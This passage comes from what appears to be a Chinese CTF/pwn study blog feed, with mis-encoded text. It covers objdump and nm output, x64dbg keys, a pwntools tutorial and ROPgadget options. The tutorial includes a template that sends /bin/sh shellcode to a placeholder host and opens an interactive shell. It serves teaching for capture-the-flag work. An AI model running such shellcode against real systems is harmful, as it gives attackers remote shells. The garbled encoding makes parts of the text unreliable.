class="line-numbers language-bash" data-language="bash"><code class="language-bash">#objdump -t test test:     file format elf64-x86-64 SYMBOL TABLE:0000000000400238 l    d  .interp        0000000000000000              .interp0000000000400254 l    d  .note.ABI-tag  0000000000000000              .note.ABI-tag0000000000400274 l    d  .note.gnu.build-id     0000000000000000              .note.gnu.build-id0000000000400298 l    d  .gnu.hash      0000000000000000              .gnu.hash00000000004002b8 l    d  .dynsym        0000000000000000              .dynsym0000000000400318 l    d  .dynstr        0000000000000000              .dynstr0000000000400358 l    d  .gnu.version   0000000000000000              .gnu.version0000000000400360 l    d  .gnu.version_r 0000000000000000              .gnu.version_r0000000000400380 l    d  .rela.dyn      0000000000000000              .rela.dyn0000000000400398 l    d  .rela.plt      0000000000000000              .rela.plt00000000004003c8 l    d  .init  0000000000000000              .init00000000004003f0 l    d  .plt   0000000000000000              .plt0000000000400420 l    d  .plt.got       0000000000000000              .plt.got0000000000400430 l    d  .text  0000000000000000              .text0000000000400634 l    d  .fini  0000000000000000              .fini0000000000400640 l    d  .rodata        0000000000000000              .rodata0000000000400678 l    d  .eh_frame_hdr  0000000000000000              .eh_frame_hdr00000000004006c0 l    d  .eh_frame      0000000000000000              .eh_frame0000000000600e10 l    d  .init_array    0000000000000000              .init_array0000000000600e18 l    d  .fini_array    0000000000000000              .fini_array0000000000600e20 l    d  .jcr   0000000000000000              .jcr0000000000600e28 l    d  .dynamic       0000000000000000              .dynamic0000000000600ff8 l    d  .got   0000000000000000              .got0000000000601000 l    d  .got.plt       0000000000000000              .got.plt0000000000601028 l    d  .data  0000000000000000              .data000000000060102c l    d  .bss   0000000000000000              .bss0000000000000000 l    d  .comment       0000000000000000              .comment0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c0000000000600e20 l     O .jcr   0000000000000000              __JCR_LIST__0000000000400460 l     F .text  0000000000000000              deregister_tm_clones0000000000400490 l     F .text  0000000000000000              register_tm_clones00000000004004d0 l     F .text  0000000000000000              __do_global_dtors_aux000000000060102c l     O .bss   0000000000000001              completed.63550000000000600e18 l     O .fini_array    0000000000000000              __do_global_dtors_aux_fini_array_entry00000000004004f0 l     F .text  0000000000000000              frame_dummy0000000000600e10 l     O .init_array    0000000000000000              __frame_dummy_init_array_entry0000000000000000 l    df *ABS*  0000000000000000              test.c0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c00000000004007f0 l     O .eh_frame      0000000000000000              __FRAME_END__0000000000600e20 l     O .jcr   0000000000000000              __JCR_END__0000000000000000 l    df *ABS*  00000000000000000000000000600e18 l       .init_array    0000000000000000              __init_array_end0000000000600e28 l     O .dynamic       0000000000000000              _DYNAMIC0000000000600e10 l       .init_array    0000000000000000              __init_array_start0000000000400678 l       .eh_frame_hdr  0000000000000000              __GNU_EH_FRAME_HDR0000000000601000 l     O .got.plt       0000000000000000              _GLOBAL_OFFSET_TABLE_0000000000400630 g     F .text  0000000000000002              __libc_csu_fini0000000000601028  w      .data  0000000000000000              data_start000000000040051d g     F .text  0000000000000014              add000000000060102c g       .data  0000000000000000              _edata0000000000400634 g     F .fini  0000000000000000              _fini0000000000000000       F *UND*  0000000000000000              printf@@GLIBC_2.2.50000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2.50000000000601028 g       .data  0000000000000000              __data_start0000000000000000  w      *UND*  0000000000000000              __gmon_start__0000000000400648 g     O .rodata        0000000000000000              .hidden __dso_handle0000000000400640 g     O .rodata        0000000000000004              _IO_stdin_used00000000004005c0 g     F .text  0000000000000065              __libc_csu_init0000000000601030 g       .bss   0000000000000000              _end0000000000400430 g     F .text  0000000000000000              _start000000000060102c g       .bss   0000000000000000              __bss_start0000000000400547 g     F .text  0000000000000070              main0000000000601030 g     O .data  0000000000000000              .hidden __TMC_END__0000000000400531 g     F .text  0000000000000016              sub00000000004003c8 g     F .init  0000000000000000              _init<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="5-æŸ¥çœ‹-oæ–‡ä»¶çš„ä¿¡æ¯"><a href="#5-æŸ¥çœ‹-oæ–‡ä»¶çš„ä¿¡æ¯" class="headerlink" title="5.æŸ¥çœ‹.oæ–‡ä»¶çš„ä¿¡æ¯"></a>5.æŸ¥çœ‹.oæ–‡ä»¶çš„ä¿¡æ¯</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump -h test.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[Pasted image 20250124143403.png]]<br>æ¥ç€å¯ä»¥ç”¨nmæŸ¥çœ‹å‡½æ•°å’Œå…¨å±€å˜é‡ï¼Œé™æ€å˜é‡<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@localhost test]# nm test.o0000000000000000 T add000000000000002a T main                 U printf0000000000000014 T sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å±€éƒ¨å˜é‡ä¸ä¼šç”Ÿæˆç¬¦å·ï¼Œæœ€ç»ˆæ˜¯åˆ†é…åœ¨æ ˆå†…å­˜ä¸­ï¼Œ<strong>ä¸ä¼šåœ¨å‡½æ•°å¤–éƒ¨è¢«å¼•ç”¨</strong></p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·x64dbg</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/</url>
      
        <content type="html"><![CDATA[<h2 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h2><ul><li>æœç´¢å­—ç¬¦ä¸²<br><img src="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/Pasted image 20250121153435.png" alt="Pasted image 20250121153435"></li><li><code>F7</code>å•æ­¥æ­¥å…¥ï¼ˆè¿›å‡½æ•°ï¼‰</li><li><code>F8</code>å•æ­¥æ­¥è¿‡</li><li>å†…å­˜çª—å£ä¸­è½¬åˆ°åœ°å€<br><img src="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/Pasted image 20250121153320.png" alt="Pasted image 20250121153320"></li></ul>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·pwntools</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7pwntools/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7pwntools/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤§è‡´æ¡†æ¶"><a href="#å¤§è‡´æ¡†æ¶" class="headerlink" title="å¤§è‡´æ¡†æ¶"></a>å¤§è‡´æ¡†æ¶</h1><h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#ç®€å•æ ·ä¾‹from pwn import *context(arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)r &#x3D; remote(&#39;exploitme.example.com&#39;, 31337)###### EXPLOIT CODE IS HEREr.send(asm(shellcraft.sh()))  r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¯¦è§£"><a href="#è¯¦è§£" class="headerlink" title="è¯¦è§£"></a>è¯¦è§£</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import * #ç”¨æ¥å¯¼å…¥pwntoolsæ¨¡å—----context(arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;) #è®¾ç½®ç›®æ ‡æœºçš„ä¿¡æ¯----r &#x3D; remote(&#39;exploitme.example.com&#39;, 31337) #ç”¨æ¥å»ºç«‹ä¸€ä¸ªè¿œç¨‹è¿æ¥ï¼Œurlæˆ–è€…ipä½œä¸ºåœ°å€ï¼Œç„¶åæŒ‡æ˜ç«¯å£r &#x3D; process(&quot;.&#x2F;test&quot;) #è¿™é‡Œä¹Ÿå¯ä»¥ä»…ä»…ä½¿ç”¨æœ¬åœ°æ–‡ä»¶,è°ƒè¯•æ—¶æ–¹ä¾¿ï¼Œtestå³ä¸ºæ–‡ä»¶å,è¿™ä½¿å¾—æ”¹å˜è¿œç¨‹å’Œæœ¬åœ°ååˆ†æ–¹ä¾¿.----asm(shellcraft.sh()) #asm()å‡½æ•°æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¾—åˆ°æ±‡ç¼–ç çš„æœºå™¨ä»£ç ã€‚&gt;&gt;&gt; asm(&#39;mov eax, 0&#39;)&#39;\xb8\x00\x00\x00\x00&#39;----shellcraftæ¨¡å—æ˜¯shellcodeçš„æ¨¡å—ï¼ŒåŒ…å«ä¸€äº›ç”Ÿæˆshellcodeçš„å‡½æ•°ã€‚å…¶ä¸­çš„å­æ¨¡å—å£°æ˜æ¶æ„ï¼Œæ¯”å¦‚shellcraft.arm æ˜¯ARMæ¶æ„çš„ï¼Œshellcraft.amd64æ˜¯AMD64æ¶æ„ï¼Œshellcraft.i386æ˜¯Intel 80386æ¶æ„çš„ï¼Œä»¥åŠæœ‰ä¸€ä¸ªshellcraft.commonæ˜¯æ‰€æœ‰æ¶æ„é€šç”¨çš„ã€‚è€Œè¿™é‡Œçš„shellcraft.sh()åˆ™æ˜¯æ‰§è¡Œ&#x2F;bin&#x2F;shçš„shellcodeäº†----r.send() #å°†shellcodeå‘é€åˆ°è¿œç¨‹è¿æ¥----r.interactive() #å°†æ§åˆ¶æƒäº¤ç»™ç”¨æˆ·ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨æ‰“å¼€çš„shelläº†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Contextè®¾ç½®"><a href="#Contextè®¾ç½®" class="headerlink" title="Contextè®¾ç½®"></a>Contextè®¾ç½®</h1><p><code>context</code>æ˜¯pwntoolsç”¨æ¥è®¾ç½®ç¯å¢ƒçš„åŠŸèƒ½ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸åŒï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›ç¯å¢ƒè®¾ç½®æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œexpï¼Œæ¯”å¦‚æœ‰ä¸€äº›éœ€è¦è¿›è¡Œæ±‡ç¼–ï¼Œä½†æ˜¯32çš„æ±‡ç¼–å’Œ64çš„æ±‡ç¼–ä¸åŒï¼Œå¦‚æœä¸è®¾ç½®contextä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è®¾ç½®contextåªéœ€è¦ç®€å•çš„ä¸€å¥è¯:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)&#39;&#39;&#39;è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š1. osè®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿï¼Œåœ¨å®Œæˆctfé¢˜ç›®çš„æ—¶å€™ï¼Œå¤§å¤šæ•°pwné¢˜ç›®çš„ç³»ç»Ÿéƒ½æ˜¯linux  2. archè®¾ç½®æ¶æ„ä¸ºamd64ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºè®¾ç½®ä¸º64ä½çš„æ¨¡å¼ï¼Œå¯¹åº”çš„32ä½æ¨¡å¼æ˜¯â€™i386â€™  3. log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼Œè¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™ä¸€èˆ¬ä¼šè®¾ç½®ï¼Œè¿™æ ·pwntoolsä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œä½¿å¾—è°ƒè¯•æ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥é¿å…åœ¨å®ŒæˆCTFé¢˜ç›®æ—¶å‡ºç°ä¸€äº›å’ŒIOç›¸å…³çš„é”™è¯¯ã€‚&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h1 id="æ•°æ®æ‰“åŒ…"><a href="#æ•°æ®æ‰“åŒ…" class="headerlink" title="æ•°æ®æ‰“åŒ…"></a>æ•°æ®æ‰“åŒ…</h1><p>æ•°æ®æ‰“åŒ…,å³å°†æ•´æ•°å€¼è½¬æ¢ä¸º32ä½æˆ–è€…64ä½åœ°å€ä¸€æ ·çš„è¡¨ç¤ºæ–¹å¼,æ¯”å¦‚0x400010è¡¨ç¤ºä¸º\x10\x00\x40ä¸€æ ·,è¿™ä½¿å¾—æˆ‘ä»¬æ„é€ payloadå˜å¾—å¾ˆæ–¹ä¾¿</p><p>ç”¨æ³•:  </p><ul><li>xxxxxxxxxx92 1ROPgadget çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š2ç”¨æ³•ï¼šROPgadget [-h] [-v] [-c] [â€”binary <binary>] [â€”opcode <opcodes>]3[â€”string <string>] [â€”memstr <string>] [â€”depth <nbyte>] [â€”only <key>]4[â€”filter <key>] [â€”range <start-end>] [â€”badbytes <byte>]5[â€”rawArch <arch>] [â€”rawMode <mode>] [â€”rawEndian <endian>] [â€”re <re>]6[â€”offset <hexaddr>] [â€”ropchain] [â€”thumb] [â€”console] [â€”norop]7[â€”nojop] [â€”callPreceded] [â€”nosys] [â€”multibr] [â€”all] [â€”noinstr]8[â€”dump] [â€”silent] [â€”align ALIGN] [â€”mipsrop <rtype>]9é€‰é¡¹ç¿»è¯‘ï¼š10 11    -h, â€”helpï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡ºã€‚12    -v, â€”versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡ºã€‚13    -c, â€”colorï¼šè¾“å‡ºå½©è‰²ç»“æœï¼ˆéœ€è¦ç»ˆç«¯æ”¯æŒï¼‰ã€‚14    â€”binary <binary>ï¼šæŒ‡å®šè¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚15    â€”opcode <opcodes>ï¼šæœç´¢åŒ…å«æŒ‡å®šæŒ‡ä»¤çš„ gadgetsã€‚16    â€”string <string>ï¼šæœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚17    â€”memstr <string>ï¼šæœç´¢åœ¨å†…å­˜ä¸­æ‰¾åˆ°æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚18    â€”depth <nbyte>ï¼šæœç´¢æŒ‡å®šæ·±åº¦çš„ gadgetsã€‚19    â€”only <key>ï¼šä»…æ˜¾ç¤ºåŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚20    â€”filter <key>ï¼šæ’é™¤åŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚21    â€”range <start-end>ï¼šåœ¨æŒ‡å®šåœ°å€èŒƒå›´å†…æœç´¢ gadgetsã€‚22    â€”badbytes <byte>ï¼šæ’é™¤åŒ…å«æŒ‡å®šå­—èŠ‚çš„ gadgetsã€‚23    â€”rawArch <arch>ï¼šæŒ‡å®šåŸå§‹æ¶æ„ï¼ˆä¾‹å¦‚ x86, amd64, arm ç­‰ï¼‰ã€‚24    â€”rawMode <mode>ï¼šæŒ‡å®šåŸå§‹æ¨¡å¼ï¼ˆä¾‹å¦‚ 32 æˆ– 64 ä½ï¼‰ã€‚25    â€”rawEndian <endian>ï¼šæŒ‡å®šåŸå§‹å­—èŠ‚åºï¼ˆä¾‹å¦‚ little æˆ– bigï¼‰ã€‚26    â€”re <re>ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ gadgetsã€‚27    â€”offset <hexaddr>ï¼šæ˜¾ç¤ºç»™å®šåç§»åœ°å€é™„è¿‘çš„ gadgetsã€‚28    â€”ropchainï¼šä¸ºæ‰¾åˆ°çš„ gadgets ç”Ÿæˆä¸€ä¸ª ROP é“¾ã€‚29    â€”thumbï¼šé’ˆå¯¹ ARM Thumb æŒ‡ä»¤é›†æœç´¢ gadgetsã€‚30    â€”consoleï¼šå°†è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼ˆåœ¨ â€”ropchain æ¨¡å¼ä¸‹æœ‰ç”¨ï¼‰ã€‚31    â€”noropï¼šä¸æ˜¾ç¤º ROP gadgetsã€‚32    â€”nojopï¼šä¸æ˜¾ç¤º JOP gadgetsã€‚33    â€”callPrecededï¼šä»…æ˜¾ç¤ºè¢«è°ƒç”¨æŒ‡ä»¤å‰é¢çš„ gadgetsã€‚34    â€”nosysï¼šä¸æ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨ gadgetsã€‚35    â€”multibrï¼šæ˜¾ç¤ºå¤šä¸ªåˆ†æ”¯çš„ gadgetsã€‚36    â€”allï¼šæ˜¾ç¤ºæ‰€æœ‰ gadgetsï¼Œæ— è¿‡æ»¤ã€‚37    â€”noinstrï¼šä¸æ˜¾ç¤ºæŒ‡ä»¤ï¼Œåªæ˜¾ç¤ºåç§»ã€‚38    â€”dumpï¼šè¾“å‡º gadgets çš„åŸå§‹å­—èŠ‚ã€‚39    â€”silentï¼šä¸æ˜¾ç¤ºä»»ä½•è­¦å‘Šæˆ–ä¿¡æ¯ã€‚40    â€”align ALIGNï¼šå¯¹ gadgets åç§»è¿›è¡Œå¯¹é½ã€‚41    â€”mipsrop <rtype>ï¼šé’ˆå¯¹ MIPS æ¶æ„ï¼ŒæŒ‡å®š ROP ç±»å‹ï¼ˆä¾‹å¦‚ rop, jop, rop_nopï¼‰ã€‚42 43è¿™äº›é€‰é¡¹å¯ä»¥å¸®åŠ©ä½ æ ¹æ®ç‰¹å®šéœ€æ±‚å®šåˆ¶ ROPgadget çš„æœç´¢å’Œåˆ†æè¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ â€”opcode æ¥æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—çš„ gadgetsï¼Œæˆ–è€…ä½¿ç”¨ â€”range æ¥é™åˆ¶æœç´¢çš„åœ°å€èŒƒå›´ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨ â€”ropchain æ¥è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŸºäºæ‰¾åˆ°çš„ gadgets çš„ ROP é“¾ï¼Œè¿™å¯¹äºå¿«é€Ÿæ„å»ºæ”»å‡»è½½è·éå¸¸æœ‰ç”¨ã€‚44 45è¿™äº›ä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ROPgadgetçš„ä¸åŒé€‰é¡¹æ¥æ‰§è¡Œç‰¹å®šçš„æœç´¢å’Œåˆ†æä»»åŠ¡ã€‚ä¸‹é¢æ˜¯æ¯ä¸ªä¾‹å­åŠå…¶ç”¨é€”çš„ä¸­æ–‡è§£é‡Šï¼š46ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x8647è¿™ä¸ªå‘½ä»¤å¯¹æŒ‡å®šçš„x86 Linux ELFäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡ŒROP gadgetsæœç´¢ã€‚48â€”â€”â€”â€”â€”â€”â€”-49ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”ropchain50è¿™ä¸ªå‘½ä»¤é™¤äº†æœç´¢ROP gadgetsä¹‹å¤–ï¼Œè¿˜è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªROPé“¾ã€‚51 â€”â€”â€”â€”â€”â€”â€”52ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”depth 353è¿™ä¸ªå‘½ä»¤æœç´¢æ·±åº¦ä¸º3çš„ROP gadgetsï¼Œå³åªæœç´¢åŒ…å«3ä¸ªæˆ–æ›´å°‘æŒ‡ä»¤çš„gadgetsã€‚54â€”â€”â€”â€”â€”â€”â€”-55ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”string â€œmainâ€56è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«å­—ç¬¦ä¸²â€mainâ€çš„ROP gadgetsã€‚57â€”â€”â€”â€”â€”â€”â€”-58ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”string â€œm..nâ€59è¿™ä¸ªå‘½ä»¤ä½¿ç”¨é€šé…ç¬¦æœç´¢åŒ…å«ä»¥â€mâ€å¼€å¤´ï¼Œæ¥ç€æ˜¯ä»»æ„å­—ç¬¦ï¼Œä»¥â€nâ€ç»“å°¾çš„å­—ç¬¦ä¸²çš„gadgetsã€‚60â€”â€”â€”â€”â€”â€”â€”-61ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”opcode c9c362è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—0xc9ï¼ˆleaveï¼‰å’Œ0xc3ï¼ˆretï¼‰çš„ROP gadgetsã€‚63â€”â€”â€”â€”â€”â€”â€”-64ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”only â€œmov|retâ€65è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movæˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚66â€”â€”â€”â€”â€”â€”â€”67ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”only â€œmov|pop|xor|retâ€68è¿™ä¸ªå‘½ä»¤ä»…æœç´¢åŒ…å«movã€popã€xoræˆ–retæŒ‡ä»¤çš„ROP gadgetsã€‚69â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”70ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”filter â€œxchg|add|sub|cmov.*â€71è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«xchgã€addã€subæˆ–ä»¥cmovå¼€å¤´çš„æŒ‡ä»¤çš„gadgetsã€‚72â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”73ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”norop â€”nosys74è¿™ä¸ªå‘½ä»¤æœç´¢gadgetsï¼Œä½†ä¸æ˜¾ç¤ºROP gadgetså’Œç³»ç»Ÿè°ƒç”¨gadgetsã€‚75â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”76ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”range 0x08041000-0x0804200077è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢ROP gadgetsã€‚78â€”â€”â€”â€”â€”â€”â€”â€”â€”79ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”string main â€”range 0x080c9aaa-0x080c9aba80è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åœ°å€èŒƒå›´å†…æœç´¢åŒ…å«å­—ç¬¦ä¸²â€mainâ€çš„ROP gadgetsã€‚81â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”82ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”memstr â€œ/bin/shâ€83è¿™ä¸ªå‘½ä»¤æœç´¢åœ¨å†…å­˜ä¸­èƒ½æ‰¾åˆ°å­—ç¬¦ä¸²â€/bin/shâ€çš„ROP gadgetsã€‚84â€”â€”â€”â€”â€”â€”â€”â€”â€”85ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”console86è¿™ä¸ªå‘½ä»¤å°†ROP gadgetsçš„è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚ç”ŸæˆROPé“¾æ—¶ï¼Œå¯èƒ½å¾ˆæœ‰ç”¨ã€‚87â€”â€”â€”â€”â€”â€”â€”â€”â€”88ROPgadget.py â€”binary ./test-suite-binaries/elf-Linux-x86 â€”badbytes â€œ00|01-1f|7f|42â€89è¿™ä¸ªå‘½ä»¤æœç´¢ROP gadgetsï¼Œä½†æ’é™¤åŒ…å«ç‰¹å®šå­—èŠ‚åºåˆ—çš„gadgetsï¼Œå¦‚ç©ºå­—èŠ‚ã€æ§åˆ¶å­—ç¬¦å’Œå­—èŠ‚0x42ã€‚90â€”â€”â€”â€”â€”â€”â€”â€”â€”91ROPgadget.py â€”binary ./test-suite-binaries/Linux_lib64.so â€”offset 0xdeadbeef0000000092è¿™ä¸ªå‘½ä»¤åœ¨æŒ‡å®šçš„åº“æ–‡ä»¶ä¸­æœç´¢åç§»`0xdeadbeef00000000Powershell</rtype></hexaddr></re></endian></mode></arch></byte></start-end></key></key></nbyte></string></string></opcodes></binary></rtype></hexaddr></re></endian></mode></arch></byte></start-end></key></key></nbyte></string></string></opcodes></binary></li><li>xxxxxxxxxx8 1$ ./download libc6_2.23-0ubuntu10_amd642Getting libc6_2.23-0ubuntu10_amd643    -&gt; Location: <a href="http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb4">http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb4</a>    -&gt; Downloading package5    -&gt; Extracting package6    -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd647$ ls libs/libc6_2.23-0ubuntu10_amd648ld-2.23.so â€¦ libc.so.6 â€¦ libpthread.so.0 â€¦shell</li></ul><p>på¯¹åº”pack,æ‰“åŒ…,uå¯¹åº”unpack,è§£åŒ…,ç®€å•å¥½è®°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload &#x3D; p32(0xdeadbeef) # pack 32 bits number<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ•°æ®è¾“å‡º"><a href="#æ•°æ®è¾“å‡º" class="headerlink" title="æ•°æ®è¾“å‡º"></a>æ•°æ®è¾“å‡º</h1><p>å¦‚æœéœ€è¦è¾“å‡ºä¸€äº›ä¿¡æ¯,æœ€å¥½ä½¿ç”¨pwntoolsè‡ªå¸¦çš„,å› ä¸ºå’Œpwntoolsæœ¬æ¥çš„æ ¼å¼å»åˆ,çœ‹èµ·æ¥ä¹Ÿæ¯”è¾ƒèˆ’æœ,ç”¨æ³•:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">some_str &#x3D; &quot;hello, world&quot;log.info(some_str)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><blockquote><p>å…¶ä¸­çš„infoä»£è¡¨æ˜¯logç­‰çº§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–logç­‰çº§ã€‚</p></blockquote><h1 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h1><p>Cyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å»å®šä½åˆ°ä»–åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚<br>åœ¨æˆ‘ä»¬å®Œæˆæ ˆæº¢å‡ºé¢˜ç›®çš„æ—¶å€™ï¼Œä½¿ç”¨patternå¯ä»¥å¤§å¤§çš„å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´ã€‚<br>ç”¨æ³•ï¼š<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">cyclic(0x100) # ç”Ÿæˆä¸€ä¸ª0x100å¤§å°çš„patternï¼Œå³ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²cyclic_find(0x61616161) # æ‰¾åˆ°è¯¥æ•°æ®åœ¨patternä¸­çš„ä½ç½®cyclic_find(&#39;aaaa&#39;) # 